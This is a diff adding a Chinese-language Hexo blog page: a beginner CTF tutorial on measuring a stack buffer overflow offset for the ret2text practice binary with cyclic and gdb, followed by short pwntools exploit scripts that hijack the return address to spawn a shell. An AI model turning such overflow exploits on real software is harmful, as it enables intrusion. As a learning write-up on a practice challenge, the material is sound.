@@ -1,0 +1,164 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（1-3-3）-手动测量变量溢出长度 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;SanOrintea&#x2F;article&#x2F;details&#x2F;82288959示例下载：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2text&#x2F;bamboofox-ret2text  接上一小节检查一下文件保护： 12345678root@ka">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（1-3-3）-手动测量变量溢出长度">
+<meta property="og:url" content="http://example.com/2020/08/03/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-3%EF%BC%89-%E6%89%8B%E5%8A%A8%E6%B5%8B%E9%87%8F%E5%8F%98%E9%87%8F%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;SanOrintea&#x2F;article&#x2F;details&#x2F;82288959示例下载：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2text&#x2F;bamboofox-ret2text  接上一小节检查一下文件保护： 12345678root@ka">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2020-08-03T03:25:33.000Z">
+<meta property="article:modified_time" content="2021-07-04T09:57:18.327Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/08/03/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-3%EF%BC%89-%E6%89%8B%E5%8A%A8%E6%B5%8B%E9%87%8F%E5%8F%98%E9%87%8F%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（1-3-3）-手动测量变量溢出长度',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-07-04 17:57:18'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">317</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（1-3-3）-手动测量变量溢出长度</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-08-03T03:25:33.000Z" title="Created 2020-08-03 11:25:33">2020-08-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:18.327Z" title="Updated 2021-07-04 17:57:18">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（1-3-3）-手动测量变量溢出长度"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SanOrintea/article/details/82288959">https://blog.csdn.net/SanOrintea/article/details/82288959</a><br>示例下载：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text</a></p>
+</blockquote>
+<p>接上一小节<br>检查一下文件保护：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/CTF<span class="comment"># pwn checksec --file=ret2text</span></span><br><span class="line">[*] <span class="string">&#x27;/root/\xe6\xa1\x8c\xe9\x9d\xa2/CTF/ret2text&#x27;</span></span><br><span class="line">    Arch:     i386<span class="literal">-32</span><span class="literal">-little</span></span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0</span>x8048000)</span><br><span class="line">root@kali:~/桌面/CTF<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>什么保护也没有开启，是一个 32 位的程序<br>老规矩载入 IDA 看一下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596425386571-00ce6ecf-1524-4b5c-b7f0-cf2b8373296d.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803112939.png&originHeight=67&originWidth=409&size=4600&status=done&style=none&width=409" alt="QQ截图20200803112939.png"><br>可以看到 s 的栈长度为 64，因此 exp 如下（python2）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = <span class="keyword">process</span>(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0</span>x804863a</span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span> * (<span class="number">0</span>x64+<span class="number">4</span>) + p32(target))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596425568231-468b0f94-13b8-4809-9af2-b615bf47e596.png#align=left&display=inline&height=166&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803113234.png&originHeight=166&originWidth=667&size=36775&status=done&style=none&width=667" alt="QQ截图20200803113234.png"><br>看来 IDA 是错的，栈长度应该测量错了，下面介绍手动测量栈长度的方法：<br>首先使用工具 cyclic 生成无序字符串，看看什么时候溢出<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596426461243-f55b1c2e-28f6-4515-8fc3-3fcbd5ee1929.png#align=left&display=inline&height=96&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803114731.png&originHeight=96&originWidth=724&size=33665&status=done&style=none&width=724" alt="QQ截图20200803114731.png"><br>使用 gdb 运行程序，这里我使用的是 peda-gdb，具体用法请看下面文章<br>输入 start：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596426693879-77b13a55-7511-4339-b6a3-92c4bb0f7305.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803115123.png&originHeight=678&originWidth=817&size=244760&status=done&style=none&width=817" alt="QQ截图20200803115123.png"><br>这是程序会自动中断在 main 函数处，输入 c 继续运行，接着将 200 个无序字符粘贴在输入框中，回车<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596427037144-c1fd39de-2634-4204-b3ac-03391fb152c6.png#align=left&display=inline&height=617&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803115427.png&originHeight=617&originWidth=1807&size=366596&status=done&style=none&width=1807" alt="QQ截图20200803115427.png"><br>观察可以知道程序的溢出点为：0x62616164，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596427063809-e3a8a915-edea-4843-877b-3967f73ee2bd.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803115701.png&originHeight=57&originWidth=403&size=13189&status=done&style=none&width=403" alt="QQ截图20200803115701.png"><br>那么怎么知道到底有多少个数字溢出了呢？<br>看他报错的意思是（跳转到 0x62616164）这步出错了，意思就是没有 0x62616164 这个位置，那这个位置是从哪来的呢，就是我们 200 个有序字符其中最先溢出的部分。那么只要知道这个 0x62616164 是我们输入的第几个，就可以数出来它前头有几个数字了。根据 ASCII 码表，又根据‘0x’是 16 进制的意思，可以查表得出这串数字转换成字母是‘baad’。接下来就要知道 cyclic 的顺序了，稍微观察一下就可以知道 cyclic 的规则（4 个数 4 个数有规则），轻易的就可以数出它的位置。<br>当然还有更简单的方法，前文也说了 cyclic 是有序字符串，自然有一个子函数可以查，“cyclic -l”代表着查询你所给的<strong>4bit</strong>字符前有几个字母。</p>
+<p>输入【cyclic -l 0x62616164】，得到 112，说明‘baad’前有 112 个字母，那么这 112 个字母就是填充空栈的所需量了。接下来多的就会溢出。如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596427238490-7087cc9e-696b-441f-ae6d-4afb67e7f785.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803120027.png&originHeight=133&originWidth=400&size=33653&status=done&style=none&width=400" alt="QQ截图20200803120027.png"><br>那么我们就要把我们要他跳转的位置放在 112（0x70）个字母后让他溢出，就可以实现跳转。<br>因此 exp 如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = <span class="keyword">process</span>(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0</span>x804863a</span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> + p32(target))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596427388207-af487bd2-cf2b-48e8-a7e4-6f5ac8fb4ae4.png#align=left&display=inline&height=136&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200803120259.png&originHeight=136&originWidth=628&size=27243&status=done&style=none&width=628" alt="QQ截图20200803120259.png"><br>成功 getshell</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2020/08/03/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-3%EF%BC%89-%E6%89%8B%E5%8A%A8%E6%B5%8B%E9%87%8F%E5%8F%98%E9%87%8F%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/">http://example.com/2020/08/03/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-3%EF%BC%89-%E6%89%8B%E5%8A%A8%E6%B5%8B%E9%87%8F%E5%8F%98%E9%87%8F%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/03/PWN%E5%85%A5%E9%97%A8%EF%BC%881-1-5%EF%BC%89-pwntools%E5%AD%A6%E4%B9%A0/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">PWN入门（1-1-5）-pwntools学习</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/02/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-2%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2text/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">PWN入门（1-3-2）-基本ROP-ret2text</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">317</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用mprotect修改程序段权限为可执行"/></a><div class="content"><a class="title" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行">利用mprotect修改程序段权限为可执行</a><time datetime="2021-06-10T07:59:46.000Z" title="Created 2021-06-10 15:59:46">2021-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SROP（1）--从两道题重新认识SROP attack"/></a><div class="content"><a class="title" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack">SROP（1）--从两道题重新认识SROP attack</a><time datetime="2021-05-31T02:14:53.000Z" title="Created 2021-05-31 10:14:53">2021-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(14)-unsortedbin attack"/></a><div class="content"><a class="title" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack">how2heap(14)-unsortedbin attack</a><time datetime="2021-05-18T07:48:53.000Z" title="Created 2021-05-18 15:48:53">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(13)-tcache_stashing_unlink_attack"/></a><div class="content"><a class="title" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack">how2heap(13)-tcache_stashing_unlink_attack</a><time datetime="2021-05-17T02:16:40.000Z" title="Created 2021-05-17 10:16:40">2021-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(12)-house of lore"/></a><div class="content"><a class="title" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore">how2heap(12)-house of lore</a><time datetime="2021-05-14T08:02:54.000Z" title="Created 2021-05-14 16:02:54">2021-05-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
